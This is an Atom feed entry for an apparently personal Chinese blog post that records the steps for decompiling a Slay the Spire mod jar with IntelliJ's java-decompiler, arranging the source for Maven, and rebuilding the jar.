    <link href="https://www.pri87.vip/posts/c2aa3be6.html"/>
    <id>https://www.pri87.vip/posts/c2aa3be6.html</id>
    <published>2024-05-19T12:35:58.000Z</published>
    <updated>2024-06-17T16:20:30.387Z</updated>
    
    <content type="html"><![CDATA[<p>今天玩杀戮尖塔，好玩，所以试了一下要怎么逆。</p><p>这个游戏是java写的，所以基本逻辑就是先把jar包反编译成java源文件，然后修改，然后用idea生成出jar包</p><p>这篇只是记录一下基本步骤：</p><p>1.反编译jar</p><p>这里使用的是idea的java-decompiler插件。</p><p>下载好之后找到java-decompiler插件的位置。</p><p>先生成一个文件夹，假设名字是test</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp <span class="string">&quot;C:\decompiler.jar&quot;</span> org<span class="selector-class">.jetbrains</span><span class="selector-class">.java</span><span class="selector-class">.decompiler</span><span class="selector-class">.main</span><span class="selector-class">.decompiler</span><span class="selector-class">.ConsoleDecompiler</span> -dgs=true target<span class="selector-class">.jar</span> test</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp <span class="string">&quot;decomiler路径&quot;</span> org<span class="selector-class">.jetbrains</span><span class="selector-class">.java</span><span class="selector-class">.decompiler</span><span class="selector-class">.main</span><span class="selector-class">.decompiler</span><span class="selector-class">.ConsoleDecompiler</span> -dgs=true 源jar路径 一个文件夹名</span><br></pre></td></tr></table></figure><p>如果正确，文件夹里会生成一个和刚刚同名的jar。解压之后得到源代码。</p><p>2.调整目录结构</p><p>由于解压后所有内容都是平铺的，需要调整目录结构让idea可以正确识别并生成，同时由于我逆的是游戏模组，所以还需要导入对应的游戏依赖包。</p><p>目录结构应该是：</p><p>test</p><ul><li>src<ul><li>main<ul><li>java<ul><li>源代码</li></ul></li><li>resources<ul><li>img</li><li>localization</li></ul></li></ul></li></ul></li></ul><p>生成jar</p><p>不是很懂maven，好像是一个管理器一样的东西，这个地方我用它来生成jar代码</p><p>详见：<a href="https://zhuanlan.zhihu.com/p/403468512">杀戮尖塔MOD制作详解</a></p><p>首先构建pom.xml</p><p>在里面填写对应的配置项</p><p>然后在右边选择package</p><p>它会自动生成，如果反编译的文件有问题，就手动修正一下（我只遇到了一个）</p><p>然后就能生成对应的jar文件了。</p><hr><p>一定要注意文件路径要正确，不然只能生成只有元数据的文件。</p>]]></content>
    
    
    <summary type="html">ss快玩！</summary>
    
    
    
    
    <category term="逆向" scheme="https://www.pri87.vip/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="java" scheme="https://www.pri87.vip/tags/java/"/>
    
  </entry>
  
</feed>
